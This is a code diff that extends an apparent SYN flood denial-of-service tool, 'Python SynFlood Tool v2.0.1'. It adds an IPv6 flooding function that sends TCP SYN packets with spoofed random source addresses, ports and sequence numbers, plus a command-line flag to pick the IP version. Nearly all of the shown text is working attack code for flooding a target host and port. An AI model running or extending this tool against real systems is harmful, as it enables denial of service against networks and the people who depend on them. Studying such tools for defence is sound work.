@@ -21,7 +21,7 @@ def randInt():
 
 def SYN_Flood(dstIP, dstPort, counter):
 	total = 0
-	print ("Packets are sending ...")
+	print ("IPv4 Packets are sending ...")
 
 	for x in range (0, counter):
 		s_port = randInt()
@@ -44,14 +44,40 @@ def SYN_Flood(dstIP, dstPort, counter):
 
 	stdout.write("\nTotal packets sent: %i\n" % total)
 
+def SYN_Flood_v6(dstIP, dstPort, counter):
+	total = 0
+	print ("IPv6 Packets are sending ...")
+
+	for x in range (0, counter):
+		s_port = randInt()
+		s_eq = randInt()
+		w_indow = randInt()
+
+		IP_Packet = IPv6 ()
+		IP_Packet.src = RandIP6()
+		IP_Packet.dst = dstIP
+
+		TCP_Packet = TCP ()
+		TCP_Packet.sport = s_port
+		TCP_Packet.dport = int(dstPort)
+		TCP_Packet.flags = "S"
+		TCP_Packet.seq = s_eq
+		TCP_Packet.window = w_indow
+
+		send(IP_Packet/TCP_Packet, verbose=0)
+		total+=1
+
+	stdout.write("\nTotal packets sent: %i\n" % total)
+
 
 def main():
 	parser = ArgumentParser()
 	parser.add_argument('--target', '-t', help='target IP address')
 	parser.add_argument('--port', '-p', help='target port number')
 	parser.add_argument('--count', '-c', help='number of packets')
+	parser.add_argument('--format', '-f', help='format of target(Can ignore, default use ipv4)')
 	parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
-	parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1"
+	parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1 -f 6"
 
 	args = parser.parse_args()
 
@@ -62,7 +88,11 @@ def main():
 				SYN_Flood(args.target, args.port, 1)
 
 			else:
-				SYN_Flood(args.target, args.port, int(args.count))
+				print(f"args.format = {args.format}")
+				if args.format == '6':
+					SYN_Flood_v6(args.target, args.port, int(args.count))
+				else:
+					SYN_Flood(args.target, args.port, int(args.count))
 
 		else:
 			print('[-]Please, use --port/-p to give target\'s port!')
